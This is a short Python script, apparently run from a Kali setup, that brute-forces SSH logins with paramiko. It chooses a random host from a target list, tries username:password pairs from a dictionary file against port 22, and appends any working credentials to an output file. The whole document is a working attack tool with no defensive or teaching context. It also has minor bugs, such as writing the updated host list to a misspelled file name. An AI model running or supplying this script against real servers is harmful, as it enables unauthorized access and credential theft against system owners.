import paramiko,threading,random

def selectssh():
    global SSH1
    data1=open(r'/home/kali/sshcrack/SSHlist.txt','r')
    SSH1=random.choice(data1.readlines()).strip()
    if SSH1 == '':
        pass
    else:
        BFattack(SSH1)
 
def BFattack(SSH):
    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    dictionary1=open(r'/home/kali/sshcrack/dictionary.txt','r')
    for pass1 in dictionary1:
        try:
            BF1=pass1.strip().split(':')
            ssh.connect(SSH,22,BF1[0],BF1[1],banner_timeout=200,timeout=15)
            print(SSH+' connected!')
            with open(r"/home/kali/sshcrack/output.txt","a",encoding="utf-8") as output:
                output.write(SSH+' '+BF1[0]+' '+BF1[1]+'\n')
                output.close()
            break
        except:
            print(SSH+' password error!')
            pass
    renewSSH(SSH)

def renewSSH(reSSH):
    with open(r"/home/kali/sshcrack/SSHlist.txt","r",encoding="utf-8") as f:
        lines = f.readlines()
   
    with open(r"/home/kali/sshcrack/SHlist.txt","w",encoding="utf-8") as f_w:
        for line in lines:
            if reSSH in line:
                continue
            f_w.write(line)

            
if __name__ == "__main__":
    for x in range(1):     
        x = threading.Thread(target=selectssh).start()  